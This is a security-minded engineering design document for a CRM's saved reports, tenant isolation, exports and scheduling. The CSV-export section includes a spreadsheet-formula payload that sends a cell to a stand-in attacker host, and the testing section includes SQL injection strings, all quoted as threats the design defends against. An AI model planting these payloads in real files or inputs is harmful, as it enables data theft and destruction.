# P3 design — saved reports and the tenant-scoped query builder

**Status: REVIEWED AND APPROVED 2026-09-19. All nine product decisions are made —
see §6, which now records the ANSWERS, not the questions. Phases 0 and 1 are
BUILT, and so are Phases 2 through 7. Phase 8's SCHEMA AND ACCESS MODEL are built; its send path is deliberately not.**

### Two things Phase 1 discovered that changed the design

1. **The application connects as a SUPERUSER that owns every table.** So RLS is
   unconditionally inert for it — which is exactly why the app is unaffected, and
   exactly why a reports pool misconfigured to use those credentials would have
   RLS silently inert while looking protected. An inert security layer is worse
   than an absent one. The pool therefore proves RLS is live BEHAVIOURALLY before
   serving anything (a query with no tenant set must return zero rows) and
   refuses outright if `REPORTS_DB_USER` equals `DB_USER` or is missing. There is
   no fallback to the app pool, deliberately.
2. **`users` carries `password_hash` and `token_version`**, so the reporting role
   gets COLUMN-level SELECT on four columns — which made `SELECT *` in the
   builder's scoped source wrong. `scopedSource()` now takes an optional
   projection from the registry. The security boundary is unchanged: the column
   names come from the registry, never a request.

### Confirmed build order

| Phase | What | State |
|---|---|---|
| **0** | Registry + generator, pure, no execution | **built** |
| **1** | Hardened execution: read-only role, RLS, restricted pool, `statement_timeout`, row cap | **built** (migration 055) |
| **2** | `saved_reports` + `saved_report_grants` + persistence + permissions | **built** (migration 056) |
| **3** | Run endpoints + provenance | **built** |
| **4** | `CustomReportBuilder` wired | **built** (a rewrite — see below) |
| **5** | `ReportDetailView` | **built** (routed by id; + the saved-reports list) |
| **6** | Canned reports, incl. Revenue by Industry and by-owner with disclosure | **built** |
| **7** | Exports (CSV, then PDF/Excel) | **built** — CSV, Excel and PDF |
| **8** | Scheduling | **schema + access model built** (migration 057); send path blocked on infrastructure |
| **9** | Caching with result age (small, droppable) | next |

### Phase 7b — Excel, where the FORMAT solves the injection problem

**XLSX has types, and that inverts the usual trade: the more complex format is
the safer one.** CSV has no types — a spreadsheet decides what a cell IS by
reading its text — so the CSV writer must neutralise a leading `=` with an
apostrophe. In xlsx a cell is a formula only when it carries an `<f>` element,
and this writer emits none: every text value goes out as `t="inlineStr"`. So
`=HYPERLINK("http://attacker/",A1)` in a deal name is stored and displayed as
that literal text, with nothing escaped and no prefix added. **Verified with a
real reader** (openpyxl): `data_type='s'`, not `'f'`.

The same typing removes the CSV's negative-number exemption entirely — `-500` is
a numeric cell, so it is a real number the recipient can sum, with no special
case to get wrong.

**THE DISCLOSURE GOES IN TWO PLACES, and that differs from the CSV on purpose.**
A CSV has one sheet and nowhere else to put the note. A workbook has sheets,
which creates a risk a CSV does not have: **a sheet is a thing you can fail to
visit**, so a reader who opens "Data" and never clicks "About this report" has
seen the figures and not the note. So the note is its own FIRST sheet (the
workbook opens on it) AND repeated above the data. The duplication is the point
— neither copy can be the one they missed.

**No new dependency.** An .xlsx is a ZIP of small XML files, and every entry
here is one we generate: five files, ASCII names, none large. `services/reports/
zip.ts` writes exactly that and nothing more — STORE only, no ZIP64, no unicode
name flag, and it throws rather than writing an archive it cannot represent
correctly. The archive is verified in tests with the SYSTEM `unzip`, not by
re-reading our own offsets, because a test that parses its own output agrees
with whatever it produced.

### Phase 8 — the schedule schema and the send-time access check

**No send path, and no endpoint that creates a schedule.** A job runner and a
mail provider are both missing (`EMAIL_TRANSPORT=log` renders to the log and
does NOT deliver), and both are Venkat's to scope. Shipping a schedule UI over
machinery that cannot fire would be a control promising delivery that never
happens. So the tables and the rule exist, tested, and nothing writes to them.

**THE DECISION, MADE STRUCTURAL: recipients are USER REFERENCES, not email
addresses.** This is the single most important column choice in migration 057.
A `recipient_email TEXT` would make the agreed model *unenforceable* — there is
no user to re-check, so an address typed into a form becomes a standing export
of workspace data to someone who may have no account, may have left, or may
never have been a member. A `user_id` makes "does this person still have access"
a question the database can answer every time, against the same predicate the
API uses. The cost is accepted: you cannot schedule a report to a customer, an
auditor, or a personal address. That is a feature boundary needing its own
decision, not an oversight.

**There is no cached visibility and no `send_as_user_id`.** `canViewPredicate`
was generalised to `canViewPredicateFor(alias, userExpr)` so the SAME rule can
be evaluated against a column, once per recipient, in one query. One
implementation of visibility, not two.

Consequences, each pinned by a test:
- revoke a grant and delivery stops on the next send, with nothing to clean up;
- deactivate an account and it stops receiving mail — reported as `inactive`
  rather than `no_access`, because "their account is off" has a different fix
  from "their access was revoked";
- the creator losing their account changes nothing for anyone else, because the
  creator was never the authority for another person's access.

**Skipped recipients are REPORTED, not filtered away.** A schedule that silently
stops mailing someone is a support mystery — they say they stopped getting the
report and nothing anywhere says why. `recipientsFor` returns a verdict per
person. A schedule nobody can currently receive is surfaced, never auto-deleted:
grants may be restored tomorrow, and discarding someone's configuration is worse
than carrying a dormant row.

**A CHECK CONSTRAINT ACCEPTS A NULL RESULT, and the first version of the cadence
constraint shipped with that bug.** `day_of_week BETWEEN 0 AND 6` is NULL — not
FALSE — when the column is NULL, so a weekly schedule with no weekday evaluated
the branch to NULL, the OR chain to NULL, and the constraint accepted it. The
one unsatisfiable row it existed to refuse was the one it let through. Found by
probing the constraint behaviourally, not by reading it; every branch now
carries an explicit `IS NOT NULL`.

`day_of_month` is capped at 28 deliberately: 29-31 do not exist in every month,
and "the 31st means the last day" is a product decision nobody has made. The cap
refuses the ambiguous case rather than silently resolving it.

**Migration 057 is NOT applied to live.** It is validated against
`bmi_crm_iso_test` and dry-run against `bmi_crm` inside a rolled-back
transaction. Applying it can wait for the infrastructure that uses it.

### PDF — built on pdfkit, and the footer is the point

`pdfkit` was approved and added (pure JS, no native build, no bundled browser).
`puppeteer` was refused: it downloads a Chromium build, so rendering a table
would mean running a browser on the server. **The dependency introduced no new
vulnerabilities** — all 8 `npm audit` findings predate it (express, body-parser,
qs, morgan, multer, uuid, brace-expansion, and ip-address via
express-rate-limit); neither pdfkit nor fontkit is flagged.

**Placement: a block under the title on page 1, AND a condensed line in the
footer of EVERY page.** The footer is what makes PDF different from the other
two formats, and the reason is the artefact's life after it leaves: a PDF is the
format most likely to be printed, forwarded, or screenshotted a page at a time,
so **page 4 on its own must still say what it is made of**. A note that exists
only on page 1 survives exactly as long as nobody separates the pages — and
separating the pages is what people do with PDFs. The column headers repeat for
the same reason.

The footer line is DERIVED from the same provenance block rather than written
independently, so it cannot assert something the page-1 note contradicts. It is
shorter because it must fit at 7pt on every page, and it keeps the two facts
that change how a figure is read: the seeded share, and whether the result was
cut off.

**A value that would be a formula elsewhere is rendered verbatim here**, with no
apostrophe. There is nothing to execute in a PDF, and copying the CSV's
workaround into a format that does not need it would put a stray `'` in front of
a legitimate value. Pinned by a test so nobody "fixes" it later.

**Verification used a real reader (pypdf), not our own bytes.** pdfkit
compresses its content streams, so grepping the buffer for a sentence would find
nothing even when the sentence renders — and worse, could be made to pass by
writing text somewhere invisible. Extraction is the only check that answers
"would a reader see this".

### Three formats, three placements, one rule

| Format | Where the note goes | The failure it guards against |
|---|---|---|
| CSV | One block above the data | One sheet, nowhere else to put it |
| XLSX | Its own first sheet AND above the data | A sheet is a thing you can fail to visit |
| PDF | Under the title AND in every page footer | Pages get separated, printed, forwarded |

All three resolve through the SAME access helper, so they cannot drift on who
may export what.

### (historical) PDF IS NOT BUILT, AND THIS WAS THE REASON

PDF is the one piece of Phase 7 that cannot be done without adding a runtime
dependency, and CLAUDE.md's "Tech stack (fixed — do not substitute without
asking)" makes that a decision rather than a judgement call. Nothing in the
backend can render one today: no `pdfkit`, no `puppeteer`, and no zip/deflate
library either.

Hand-rolling was considered and rejected, unlike the ZIP writer, and the
difference is worth recording. The ZIP container is a fixed, tiny, fully
specified problem with five known inputs. A PDF renderer is open-ended —
pagination, font metrics for column widths, text escaping, and the standard-14
width tables — and getting it subtly wrong produces a file a reader refuses to
open, reported as "corrupt" with no indication of which part is at fault.

Recommendation when it is picked up: **`pdfkit`** — pure JS, no native build
step, no headless browser. `puppeteer` should be refused outright: it downloads
a Chromium build, and rendering a report would mean running a browser on the
server to lay out a table.

The disclosure placement is already decided for when it is: **a PDF is a
document, not data**, so the note belongs in a block under the title on page 1,
and repeated in the page footer — because a PDF is the format most likely to be
printed, forwarded, or screenshotted one page at a time, and page 4 on its own
must still say what it is made of.

### Phase 7 — CSV export, and the two things it had to get right

**The disclosure is IN the file.** ReportsPage carried the rationale for the
whole time export was disabled, and it was the design brief: *"writing those
into a file the user keeps is worse than showing them on screen: on screen they
are surrounded by context, in a spreadsheet they become someone's evidence."* A
CSV of 15 seeded rows mailed to a manager is indistinguishable from a CSV of 15
real ones, so the preamble carries the same sentence the screen shows, above the
data, plus the figures behind it, the coverage lines, the currency note and a
dedicated `TRUNCATED` row.

The cost is that the file is not a bare data rectangle — a naive parser reads the
preamble as rows. **That is a deliberate trade and is the one thing in this phase
worth a second opinion**: a file that is slightly awkward to machine-parse is a
much smaller problem than one that misrepresents what it contains.

**CSV INJECTION IS A REAL PATH HERE, not a theoretical one.** Dimension values
are user-supplied — deal names, company names, sources — and a cell beginning
`=`, `+`, `-`, `@` or a tab is executed by Excel and Sheets.
`=HYPERLINK("http://attacker/?x="&A1,"Q3 numbers")` in a deal name becomes a
link that exfiltrates the neighbouring cell when clicked, and the victim is
whoever opens the file, who need not be in the workspace at all. Cells are
neutralised with a leading apostrophe on top of RFC 4180 quoting.

**Negative numbers are exempted on purpose.** `-500` starts with a dangerous
character and is also the likeliest legitimate value in a revenue report;
prefixing it makes the cell text and silently breaks every SUM the recipient
writes — a correctness bug introduced by a security fix. A value parsing as a
finite number is left alone; the actual attack shape (`-1+1+cmd|...`) is NaN and
is still caught.

Both export routes resolve the report through ONE helper that applies
`canViewPredicate`, so an export can never be a way to read a report you cannot
open. Downloads reuse `config/fileStorage.streamHeaders` rather than a second
hand-rolled pair, so they inherit `nosniff`, the `default-src 'none'; sandbox`
CSP and RFC 6266 filename encoding.

### What Phase 6 found by running the disclosure at volume

The reports were the small part. Running them against the live workspace found
**four defects in the provenance block Phase 3 built**, none of which any test
had caught, because every test to that point used data the test itself created.

1. **THE DISCLOSURE CONTAINED A FALSE STATEMENT.** It said unlinked rows "have
   no accounts linked and are not counted". Every join is a LEFT JOIN, so those
   rows are NOT dropped — they are kept with a NULL dimension and land in a
   bucket of their own. Grouping live deals by industry produced
   `{industry: null, value: 140000, count: 2}` sitting in the result while the
   sentence beneath it said those two rows were not counted. A disclosure that
   misdescribes the data is worse than none, because it is read as the
   authoritative account of what is on screen. **A Phase 3 test was pinning the
   bug** — it asserted the sentence verbatim.

2. **COVERAGE COULD NOT SEE THE BIGGER GAP.** It was built from
   `definition.joins` only, so a dimension reached through a SUPPORT SOURCE
   produced no entry at all. Grouping live deals by "Owner (linked user)" — which
   resolves through `users` — put **17 of 18 rows into one unlabelled bucket
   worth 1,207,000** and reported `coverage: []`. Coverage is now measured per
   DIMENSION as well, which is also the number a reader actually wants: not "did
   the join resolve" but "how many rows could be placed at all".

3. **SUMS ADDED UNLIKE CURRENCIES.** `deals` live holds 17 USD rows and one AED
   row, so `SUM(value)` returned 1,237,000 of nothing with the same confidence
   as a correct figure. This is the trap `PROJECTION_RULES` already refuses
   ("reported by currency, never converted") reached from another direction.
   There are no exchange rates here and inventing one would be a fabricated
   number with a decimal point, so: the registry marks `deals.value` as money
   via `currencySql`, the builder measures the spread, the disclosure states it
   — and **both shipped reports group BY currency**, which makes every total a
   real total rather than merely a warned-about one. The warning is suppressed
   when a report already groups by currency, so it cannot become noise.

4. **"Based on 1 rows."** The other two branches pluralised correctly, which is
   how it survived — the bug was in the branch nobody read aloud.

### Two decisions inside the canned reports

**They are NOT rows in `saved_reports`.** A migration inserting one row per
workspace was rejected: a workspace created later would not have them, they
would be editable and deletable so "the Revenue by Industry report" would mean
something different per tenant, and improving one would become a data migration.
They live in `services/reports/canned.ts`, and their ids are prefixed `canned:`
— not a valid UUID, so they can never collide with a saved report's id nor be
stored as one. That is what lets ONE route serve both. Every write path refuses
a canned id before the query, because `id` is a UUID column and an unguarded
`canned:...` reaches Postgres as 22P02 and is masked as a bare 500.

**Pipeline by Owner groups on the LINKED USER, and it costs the report most of
its rows.** `deals` carries both `assigned_to` (free text, 16 of 18 populated)
and `assigned_to_user_id` (a real reference, 1 of 18). Grouping on the typed
name would look far better and would be the same defect removed three times
already — two people sharing a name merge, one person typed two ways splits.
So it groups on the reference and says plainly that 15 of 16 are unattributed.
**The fix is the `assigned_to_user_id` backfill**, already recorded as not a P3
prerequisite. Until then this report is mostly one honest row.

### What Phase 5 had to include, and why it is not scope creep

The phase was "route ReportDetailView by id, not slug". Doing only that would
have left the work incoherent, because **all 21 cards on ReportsPage are
`UNBACKED_REPORTS`** — a catalogue of reports that are not built, each carrying
its reason. Not one is a `saved_reports` row.

So the old `View` button had no id to be converted to an id-based link: it could
only ever lead somewhere invented, which is exactly what it did. Removing the
slug route therefore orphaned both ends at once — 21 buttons pointing nowhere
honest, and a new `/crm/reports/:reportId` reachable only by typing a URL.

A route with no navigation path is this project's documented dashboard bug: a
fix that was correct and invisible for three commits because the sidebar pointed
at `/dashboard` while the page lived at `/crm/dashboard` (lesson 5). So Phase 5
also added **`SavedReportsSection`** — the workspace's real saved reports, from
the `GET /reports` that Phase 2 already served, each linking by id. No new
endpoint, no new query.

What did NOT come along: the canned reports themselves (Revenue by Industry and
the rest) stay Phase 6. This is the list and the detail page, not the content.

**Sharing landed here too**, because Phase 2 built the grants schema and all
three endpoints and no phase owned the UI. The facade had a share modal
collecting three hardcoded colleagues, an "allow edit" switch and a "notify by
email" switch, persisting none of it — two of those three now exist for real.
The email notification does not, and is not offered: `services/email` has two
consumers and this is not one, so the dialog says plainly that nobody is
emailed.

### The slug was a display name used as a primary key

Worth recording next to the `forecast_snapshots.rep_name` and
`deals.company_name` decisions, because it is the same defect in a third place:

`/crm/reports/:reportSlug` was fed `title.toLowerCase().replace(/\s+/g, '-')`
by the caller, and the page title-cased it back to produce its heading. It did
not round-trip — "Revenue by Industry" returned as "Revenue By Industry" — and
two reports sharing a name would have shared a URL. `saved_reports` has
`UNIQUE (tenant_id, name)`, so names are unique per workspace *today*, which is
precisely the kind of incidental fact that makes a name-as-key look safe until
someone relaxes the constraint.

### What Phase 4 discovered — the vocabulary was only half served

The design said the client would render the served registry rather than keep its
own copy, and Phase 2 served `modules`, `fields` and `grant_levels` accordingly.
**It did not serve the aggregation and operator vocabularies**, so the builder
still held those two lists locally — the exact `invitableRolesFor` shape this
repo has a documented bug for.

Worse, two rules the server enforces were nowhere in the payload at all:

- **arity** — how many values an operator takes (`between` needs two, `is_null`
  none). A form that guesses this renders the wrong number of value inputs.
- **field-type applicability** — `contains` compiles to ILIKE and the builder
  refuses it on anything but a `string` field. Without this served, the picker
  offers "contains" on a currency column and the server answers 400 for a choice
  the UI presented as valid.

`OPERATOR_ARITY`, `AGGREGATION_NEEDS_FIELD` and `OPERATOR_FIELD_TYPES` in
`types.ts` now declare all three, `GET /reports` serves them, and the builder
filters its operator picker by the selected field's type. **They are a
DESCRIPTION of `filterSql`'s switch, not a second implementation of it** — so
`reportQueryBuilder.test.ts` drives every operator at its declared arity and on a
field of a type it is and is not declared for, asserting the builder agrees. That
is what stops the description drifting from the thing it describes.

One registry fact worth recording because it is genuinely counter-intuitive:
**`deals.source` is typed `enum`, not `string`**, so `contains` does not apply to
it. It reads like a free-text field and is not. A client guessing which fields
are "text" would have got that wrong, which is the concrete argument for serving
the rule rather than inferring it.

**RLS moved from last to Phase 1 on Venkat's decision**, and it is better there
than originally argued for a reason underweighted at design time: adjacency lets
the two layers be mutation-tested AGAINST EACH OTHER — sabotage the generator's
tenant predicate and assert RLS still blocks the read, which demonstrates
independence rather than asserting it.

**Permissions folded into Phase 2** rather than staying a late phase: "owner may
grant edit rights to specific people" is not an enum, so `saved_report_grants`
must exist when `saved_reports` is created, or it becomes a second migration plus
a backfill.

**v1 grew.** Scheduling needs a job runner, which does not exist in this codebase
— no cron, no queue, no worker. That is larger new infrastructure than the RLS
work, and it is now in scope.

Every number below was measured against live `bmi_crm` on 2026-09-16, after the
test-data cleanup — not carried over from an earlier round.

---

## 1. `saved_reports` — what it stores

```sql
CREATE TABLE saved_reports (
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    tenant_id    UUID NOT NULL REFERENCES tenants(id) ON DELETE CASCADE,
    name         VARCHAR(255) NOT NULL,
    description  TEXT,
    category     VARCHAR(100),
    definition   JSONB NOT NULL,
    owner_id     INTEGER,
    visibility   VARCHAR(20) NOT NULL DEFAULT 'private',
    created_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),

    CONSTRAINT saved_reports_owner_fkey
      FOREIGN KEY (owner_id, tenant_id) REFERENCES users (id, tenant_id) ON DELETE SET NULL,
    CONSTRAINT saved_reports_visibility_check
      CHECK (visibility IN ('private', 'workspace')),
    CONSTRAINT saved_reports_definition_shape_check
      CHECK (definition ? 'v' AND definition ? 'base'
             AND definition->>'base' IN ('deals','companies','leads','contacts','activities')),
    CONSTRAINT saved_reports_name_unique UNIQUE (tenant_id, name)
);
```

Notes on the choices, and why each is the way it is:

- **`owner_id` is a COMPOSITE FK to `users(id, tenant_id)`** — the same shape
  `user_sales_profiles` and `meetings.owner_id` use. A plain FK to `users(id)`
  would let a report in workspace A be owned by a user in workspace B, because
  `users.id` is a global primary key.
- **`ON DELETE SET NULL` on the owner, not CASCADE.** A saved report is
  workspace configuration that outlives the person who wrote it. Same call as
  `forecast_snapshots.user_id`; the opposite of `quotas.user_id`, which CASCADEs
  because a quota without its person is meaningless.
- **`definition` is JSONB and NEVER contains SQL.** See §1.1.
- **`definition->>'base'` is CHECK-constrained**, so a definition naming a table
  outside the allowlist cannot be stored *at all* — not by the API, not by a
  hand-typed `INSERT`. This is the both-layers pattern from migrations 049 and
  050: the controller validates the whole definition, and the database refuses
  the one field that decides which table gets read.
- **No `is_seed`/`is_test` on this table.** Saved reports are configuration, not
  records of anything.

### 1.1 The query definition — structured, versioned, no SQL

```jsonc
{
  "v": 1,                                  // definition_version; see below
  "base": "deals",                         // a MODULE KEY, not a table name
  "joins": ["companies"],                  // module keys, validated against the join graph
  "dimensions": [ { "field": "companies.industry" } ],
  "metrics": [
    { "agg": "sum",   "field": "deals.value" },
    { "agg": "count", "field": "deals.id"    }
  ],
  "filters": [
    { "field": "deals.stage_type", "op": "eq", "value": "won" },
    { "field": "deals.expected_close_date", "op": "between", "value": ["2026-07-01","2026-09-30"] }
  ],
  "sort":  [ { "by": "metric:0", "dir": "desc" } ],
  "limit": 200
}
```

**Every `field` is a KEY into a server-side registry, never a column name and
never a fragment.** `"companies.industry"` is a lookup, and the registry decides
that it means `c.industry`. `"deals.value; DROP TABLE"` is not a dangerous string
— it is a key that does not exist, and the request is a 400. Operators (`eq`,
`in`, `between`, `gte`…) are likewise keys mapping to fixed SQL; `value` is
always a bound parameter and never interpolated.

**`v` exists because this shape will change.** A saved report is stored config
that outlives the code that wrote it: a v1 definition must still run, or say
clearly that it cannot, after the registry grows. Reading a definition whose `v`
the server does not know is an error with a message, not a best-effort parse.

**This aligns with what the existing builder UI already produces** —
`ReportConfig` in `CustomReportBuilder.tsx` already has `dataSource`,
`selectedFields`, `filters`, `groupBy`, `sortBy`, `sortDirection` and
`calculations`. The UI does not need rewriting to feed this; it needs its field
pickers repointed at a served registry instead of local arrays. That is also the
project's served-not-mirrored rule: the client renders the registry the server
enforces, rather than keeping its own copy that drifts (the `hr` lesson).

---

## 2. The security model — why the `tenant_id` filter cannot be dropped

This is the part that matters. A user-defined query builder is the one place in
this codebase where a missed `workspace_id` predicate is not a bug in one
hand-written query but a bug in a *generator*, reachable by any report anyone
saves. The design is therefore about making the unsafe query **inexpressible**,
not about remembering to add a predicate.

### 2.1 Layer 1 — a registry, not free-form input (structural)

Two server-side constants, the only source of truth:

```ts
// Which modules exist, what table each is, and what may join to what.
const REPORT_MODULES = {
  deals:      { table: 'deals',      alias: 'd', joins: { companies: 'd.company_id = c.id',
                                                          leads:     'd.lead_id = l.id' } },
  companies:  { table: 'companies',  alias: 'c', joins: { } },
  contacts:   { table: 'contacts',   alias: 'ct', joins: { companies: 'ct.company_id = c.id' } },
  leads:      { table: 'leads',      alias: 'l', joins: { } },
  activities: { table: 'activities', alias: 'a', joins: { deals: 'a.deal_id = d.id', /* … */ } },
} as const;

// Which fields may be named, and what each one IS.
const REPORT_FIELDS = {
  'deals.value':              { sql: 'd.value',   type: 'number', aggregatable: true },
  'deals.stage_type':         { sql: 'ps.stage_type', type: 'enum', joinsVia: 'pipeline_stages' },
  'companies.industry':       { sql: 'c.industry', type: 'enum',  aggregatable: false },
  // …
} as const;
```

A client can only ever send keys. There is no code path that takes a table or
column name from a request and puts it into SQL.

### 2.2 Layer 2 — a table can only be named through a scoped source (the structural guarantee)

The important move. The generator does **not** emit `FROM deals d`. There is
exactly one function that can produce a FROM or JOIN source, and it always wraps
the table in a tenant-scoped inline view:

```ts
function scopedSource(moduleKey, params) {
  const m = REPORT_MODULES[moduleKey];               // unknown key throws
  params.push(tenantId);
  return `(SELECT * FROM ${m.table} WHERE tenant_id = $${params.length}) ${m.alias}`;
}
```

So the generated SQL looks like:

```sql
FROM (SELECT * FROM deals     WHERE tenant_id = $1) d
LEFT JOIN (SELECT * FROM companies WHERE tenant_id = $2) c
       ON d.company_id = c.id AND d.tenant_id = c.tenant_id
```

**Why this and not "remember the WHERE clause":** with a single `WHERE
tenant_id = $1` on the base table, a *join* to another table still needs its own
predicate, and that is exactly the omission that produced this project's real
leak — CLAUDE.md records it as "not a missing `WHERE` clause but an unscoped
`JOIN`". Here a table that has not been scoped cannot appear in the query,
because the only way to name one is through a function that scopes it. Forgetting
is not an available mistake.

**Joins additionally carry `AND parent.tenant_id = child.tenant_id`** — the
existing project rule, kept because every FK here references a global primary
key, so a reference that already crosses workspaces must not be readable through
either side.

### 2.3 Layer 3 — an assertion on the assembled SQL (cheap, not the guarantee)

Before execution: count the sources the generator created and count the
`tenant_id = $n` predicates in the emitted SQL. A mismatch throws rather than
executing. This is a tripwire for a future refactor, explicitly **not** the
guarantee — if it ever fires, layer 2 has been broken and that is the bug.

### 2.4 Recommended hardening — a read-only role with RLS *(product/infra decision)*

The strongest available belt, and I'd recommend it, but it is a decision rather
than a detail: execute report queries as a **dedicated read-only Postgres role**
with **row-level security** policies keyed on a per-transaction
`SET LOCAL app.tenant_id`. Then a bug in the generator cannot cross tenants at
all, and the report path additionally cannot write.

Cost, stated honestly: a new role, RLS policies on the five tables, and a second
connection pool. The app today uses one pool with no per-request session
variable, so this is new infrastructure rather than a flag. It is *not* required
for correctness of layers 1–3; it removes a whole class of future mistake.
**Flagging for Venkat** — see §6.

### 2.5 How I would mutation-test this boundary

Mutation testing is the project's established practice, and here it is the
deliverable rather than a nicety. Each mutation is applied in turn and must fail
a named test; a mutation that passes is a missing test, not a safe mutation.

| # | Mutation | Must fail |
|---|---|---|
| 1 | Drop `WHERE tenant_id` from `scopedSource` | "a report never returns another workspace's rows" |
| 2 | Drop `AND parent.tenant_id = child.tenant_id` from the join | "a cross-workspace FK cannot be read through a join" |
| 3 | Let `REPORT_FIELDS` fall through to the raw key | "an unknown field is a 400, not a column" + an injection test |
| 4 | Let `REPORT_MODULES` fall through to the raw key | "an unknown module is a 400" |
| 5 | Disable the layer-3 assertion | **nothing should fail** — if only this catches 1 or 2, defence in depth is absent and that is a finding |
| 6 | Accept `definition.base` without the CHECK (drop it in SQL) | "the DATABASE refuses a definition naming an unlisted table" |
| 7 | Interpolate `filter.value` instead of binding it | an injection test with `'; DROP TABLE deals; --` as a filter value |

Plus one **property test** rather than examples: for every module in the
registry, and every legal join pair, generate the SQL and assert the number of
`tenant_id = $` predicates equals the number of sources. That covers registry
entries added later, which is where the next mistake will actually be.

Plus the fixture the project already relies on: two workspaces, identical data,
and every report run asserted to return only the caller's rows — the shape
`tenantIsolation.test.ts` already uses.

---

## 3. Module scope — and why HRMS is excluded structurally, not by policy

Verified against `information_schema` on 2026-09-16:

| Module | `tenant_id` | In the registry |
|---|---|---|
| `deals` | yes | **yes** |
| `companies` | yes | **yes** |
| `leads` | yes | **yes** |
| `contacts` | yes | **yes** |
| `activities` | yes | **yes** |
| `pipeline_stages` | yes | yes — needed for `stage_type` (won/lost) |
| `users` | yes | dimension only (owner name) |
| **`employees`** | **NO** | **impossible** |

**`employees` has no `tenant_id` column at all.** That is not a policy
preference — `scopedSource` requires a tenant column to emit its predicate, so an
`employees` entry in `REPORT_MODULES` cannot be constructed. The HRMS boundary is
enforced by the same mechanism that enforces tenant isolation, which is the
strongest form of "do not join HRMS" available. This matches the call already made
in Meeting Agent (migration 049 deliberately omits `'employee'` from
`meetings.related_to_type`, unlike `tasks`).

**Two joins are real but nearly empty, and the design must not hide that:**

- `deals.assigned_to_user_id` — **1 of 21 deals (5%)**. Any "by owner" report is
  effectively unbacked through the FK; the legacy free-text `deals.assigned_to`
  is what actually carries ownership on live data. A by-owner report must either
  group on the text (and say it is a display name, not a user) or be listed as
  unbacked. **This is the same "a display name is not a key" problem migrations
  039–043 exist to remove, and it is not P3's job to fix.**
- `activities` — **0 rows**. Every activity-based report is honestly empty today,
  and the activity-attribution gap (no user reference on `activities`) is already
  tracked.

---

## 4. Seeded-vs-real disclosure

Current live figures, for the 18 visible (non-test) deals:

| | |
|---|---|
| Visible deals | **18** |
| With a `company_id` (the join "Revenue by Industry" needs) | **16 (89%)** |
| Of those 16: **seeded** | **13** |
| Of those 16: **real** | **3** |
| Seeded share of all visible deals | 15 of 18 (**83%**) |
| Companies with an `industry` | 15 of 15 (100%) |

**Coverage and provenance are two different numbers, and reporting either one
alone is misleading.** "89% of deals are linked to an account" is true and
invites the reader to trust the chart. "81% of the rows behind this chart are
demo data" is the fact that changes how they read it.

So every report result — canned or custom — carries a provenance block, and it is
computed by the runner rather than by each card:

```jsonc
"provenance": {
  "rows_returned":   16,
  "rows_seeded":     13,        // is_seed = true
  "rows_real":        3,
  "excluded_test":    3,        // is_test = true, excluded as everywhere else
  "coverage": { "join": "deals.company_id", "matched": 16, "of": 18 }
}
```

And the UI renders a **sentence**, not a badge:

> Based on 16 of 18 deals — **13 of them seeded demo data**, 3 real. Three deals
> have no account linked and are not counted.

Design rules that follow from Wave 6:

1. **Seeded rows are INCLUDED by default and disclosed.** Excluding them leaves
   "Revenue by Industry" describing three deals, which is the exact failure
   `UNBACKED_REPORTS` documents. Migration 052 deliberately added no query-level
   exclusion for `is_seed`, for this reason.
2. **`is_test` rows stay excluded**, as everywhere else in the app.
3. **A report whose input is >50% seeded says so above the chart, not in a
   footnote.** The threshold is a product choice (§6).
4. **If `rows_seeded` cannot be computed** — a module without `is_seed` — the
   block says so rather than reporting zero. A `0` that means "not measured" is
   the defect this project keeps removing.

---

## 5. What `ReportDetailView` needs to stop being a stub

It currently calls `getReportData(reportName)`, which branches on the URL slug
and returns hardcoded `chartData`, `pipelineData` and `tableData`. It needs
exactly three things:

1. **`GET /reports/:id`** — the saved report's name, description, category and
   definition, so the page can title itself and show what it is showing.
2. **`GET /reports/:id/run`** (optionally `?period=`) — `{ columns, rows,
   provenance }`. Its three existing fixtures map onto one result set:
   `tableData` → `rows`; `chartData` → the dimension/metric series; `pipelineData`
   → the same series when the dimension is a stage. One endpoint, three
   renderings.
3. **A route keyed on the report's ID, not a slug.** The slug is what let the
   page fabricate: `getReportData` *guessed* content from the URL text. A real
   report is a row; the URL should name it.

Two things it does today that must not survive: **exports** (`handleExportPDF`
was a `console.log`, now an honest alert) and **scheduling** (collects a
frequency and recipients that go nowhere). Both need the email service and a
scheduler, and both are out of P3 unless you want them in.

---

## 6. Product decisions — ANSWERED 2026-09-19

Recorded as answers so a later reader does not mistake this for an open list.

1. **Sharing: private by default; the owner may grant rights to specific people,
   at TWO LEVELS — `view` and `edit`** (refined 2026-09-21). `view` is the floor
   any share confers; `edit` sits on top and implies it. There is deliberately no
   edit-without-view, and it is not merely discouraged: one grant row per
   (report, user) holding one level makes that state UNREPRESENTABLE.
   This SUPERSEDES the `visibility` enum sketched in §1 — and there is no
   `visibility` column at all, because "private" is simply the absence of grants.
   A column beside the grants table would be two sources of truth for one
   question.
2. **Create/edit/delete** follows from (1): the owner, plus anyone holding an
   explicit edit grant.
3. **Seeded rows are NEVER user-excludable.** Included and disclosed, always. The
   builder has no code path that can filter `is_seed`, and a test asserts the
   emitted SQL never mentions it — the capability does not exist rather than
   being defaulted off.
4. **Threshold: 50%**, `MOSTLY_SEEDED_THRESHOLD` in `types.ts`.
5. **5,000 rows, 10s timeout, truncation always disclosed.** The builder asks for
   `MAX_ROWS + 1`, so truncation is DETECTED rather than assumed: a plain
   `LIMIT 5000` returning exactly 5,000 rows is indistinguishable from a report
   that genuinely has 5,000.
6. **Caching allowed; result age must always be shown when served from cache.**
   Phase 9, deliberately last — premature caching hides freshness bugs.
7. **RLS + read-only role: YES, build it now** — resequenced to Phase 1.
8. **No `assigned_to_user_id` backfill** — it would need the fuzzy name-matching
   this project refused elsewhere (039-043). "By owner" ships in Phase 6 with the
   same honest-disclosure treatment as the other weak joins. The registry
   therefore exposes BOTH `deals.assigned_to` ("Owner (name as entered)") and
   `deals.owner_name` ("Owner (linked user)"), labelled so a reader knows which
   one they are grouping on.
9. **Exports and scheduling are IN for v1** (Phases 7 and 8). The job runner does
   not exist yet.
